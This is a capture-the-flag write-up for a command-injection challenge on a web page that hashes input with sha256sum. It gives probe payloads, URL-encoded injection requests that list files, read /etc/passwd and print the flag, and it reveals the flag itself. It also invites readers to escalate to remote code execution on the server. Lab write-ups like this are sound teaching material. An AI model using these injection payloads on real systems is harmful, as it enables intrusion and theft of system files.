@@ -1,0 +1,40 @@
+Challenge 046 : Medium Level command injection
+
+It's a simple web page that converts to sha256 prolly
+let's try some random inputs
+
+try me || uname -a
+;ls -al
+try me; ls
+
+notice carefully at the end there is "-" sign which is linuxcli md5sum program (Google it)
+it gives us the idea that command at the backend is something like : echo "string" | sha256sum
+
+
+GET /index.php?string=try  :  (try)
+        95fdbdf2fea4b306d059facf26c18d94cb190189a3221008eca14c5dd0b0fce1  -
+
+GET /index.php?string=lol;%20try   :  (lol; try)   
+	e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855  -
+
+GET /index.php?string=lol;%20echo%20try    :   (lol; echo try)
+	95fdbdf2fea4b306d059facf26c18d94cb190189a3221008eca14c5dd0b0fce1  -
+
+The output of 1 and 3 is same, so it does mean that 
+the command goes like
+echo lol; echo try | sha56sum   .. so it prints lol first and then applies sha256sum on try
+
+so, command injection is possible :D
+
+let's try :  try me;ls -al; something
+	     lol%3Bls%20-al;echo+try
+
+it will list all the files in that directory.. and there's ur file : EPL.txt
+
+get value : lol%3Bcat%20EPL.txt;echo+try
+get request :  test;%20cat%20/etc/passwd;%20something
+cat file EPL.txt to get the flag i.e. : thenew_flag
+
+you can play around now leading this to Remote Code Execution on the main server.. there might be something more hidden on it ;)
+
+
